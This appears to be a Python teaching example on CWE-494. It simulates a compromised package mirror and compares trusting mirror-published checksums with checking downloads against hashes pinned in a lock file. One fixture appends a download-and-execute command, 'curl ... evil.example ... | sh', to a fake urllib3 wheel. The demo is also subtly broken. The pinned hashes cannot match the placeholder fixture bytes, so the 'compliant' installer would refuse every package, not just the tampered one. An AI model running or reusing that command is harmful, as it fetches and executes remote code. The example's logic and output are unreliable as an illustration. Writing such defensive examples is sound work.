"""CWE-494: download without integrity check — verify against hashes pinned in the lock

https://cwe.mitre.org/data/definitions/494.html

A checksum fetched from the same server as the file proves nothing: whoever
can swap the wheel on a compromised mirror can swap its .sha256 too. The hash
has to come from somewhere the attacker cannot write, which in practice is
the lock file reviewed and committed in your repository.

This is what `pip install --require-hashes -r requirements.txt` enforces:
every requirement is pinned with == and carries --hash=sha256:..., every
downloaded file must match one of its hashes, and anything not in the lock
(a surprise transitive dependency) is refused. The installers below run that
logic against an embedded lock and an embedded "mirror".
"""

import hashlib
import hmac
import re

LOCK = """\
# generated by pip-compile --generate-hashes
requests==2.32.3 \\
    --hash=sha256:3634354727cea68efc182b55ed68273b9d8d4be2c35d6502abcc293ca347d164
idna==3.10 \\
    --hash=sha256:fe53bfe5a7144fd9d5af5ccf6eb5531e3706dc64dcd8eea872bbd6f91b5097d4
urllib3==2.2.3 \\
    --hash=sha256:125e64577c833b2391feb902778c8bbe8017f919fb735cec32f1b060e8530441
certifi==2024.8.30 \\
    --hash=sha256:f21234db187a3ea13eb54127653dec9dabdc5b78c7778deb146260f9a47b9408
"""


def wheel(name: str, version: str) -> bytes:
    return f"PK\x03\x04 {name}-{version}-py3-none-any.whl (fixture payload)".encode()


def build_mirror() -> dict[str, tuple[str, bytes, str]]:
    """name -> (version, file bytes, checksum the mirror publishes next to it)."""
    mirror = {}
    for name, version in [("requests", "2.32.3"), ("idna", "3.10"),
                          ("urllib3", "2.2.3"), ("certifi", "2024.8.30"),
                          ("colorama", "0.4.6")]:
        data = wheel(name, version)
        if name == "urllib3":  # compromised mirror: payload and checksum both replaced
            data += b"\nimport os; os.system('curl -s https://evil.example/x | sh')"
        mirror[name] = (version, data, hashlib.sha256(data).hexdigest())
    return mirror


def parse_lock(text: str) -> dict[str, tuple[str, set[str]]]:
    joined = re.sub(r"\\\n", " ", text)  # backslash-newline continues a requirement
    lock = {}
    for line in joined.splitlines():
        line = line.split("#", 1)[0].strip()
        if not line:
            continue
        req, *opts = line.split()
        name, version = req.split("==")
        hashes = {o.removeprefix("--hash=sha256:") for o in opts if o.startswith("--hash=sha256:")}
        lock[name.lower()] = (version, hashes)
    return lock


def noncompliant_install(wanted: list[str], mirror) -> list[str]:
    log = []
    for name in wanted:
        version, data, published = mirror[name]
        ok = hashlib.sha256(data).hexdigest() == published  # checks the mirror against itself
        log.append(f"{name}=={version}: {'installed' if ok else 'checksum mismatch'}")
    return log


def compliant_install(wanted: list[str], mirror, lock) -> list[str]:
    log = []
    for name in wanted:
        version, data, _ = mirror[name]
        if name not in lock:
            log.append(f"{name}=={version}: refused, not in lock (no hash pinned)")
            continue
        pinned_version, hashes = lock[name]
        actual = hashlib.sha256(data).hexdigest()
        if version != pinned_version:
            log.append(f"{name}=={version}: refused, lock pins {pinned_version}")
        elif not any(hmac.compare_digest(actual, h) for h in hashes):
            log.append(f"{name}=={version}: refused, sha256 {actual[:12]}... not in lock")
        else:
            log.append(f"{name}=={version}: installed (sha256 {actual[:12]}...)")
    return log


def main() -> None:
    mirror = build_mirror()
    lock = parse_lock(LOCK)
    wanted = ["requests", "idna", "urllib3", "certifi", "colorama"]
    for line in noncompliant_install(wanted, mirror):
        print(f"noncompliant: {line}")
    for line in compliant_install(wanted, mirror, lock):
        print(f"compliant:    {line}")


if __name__ == "__main__":
    main()

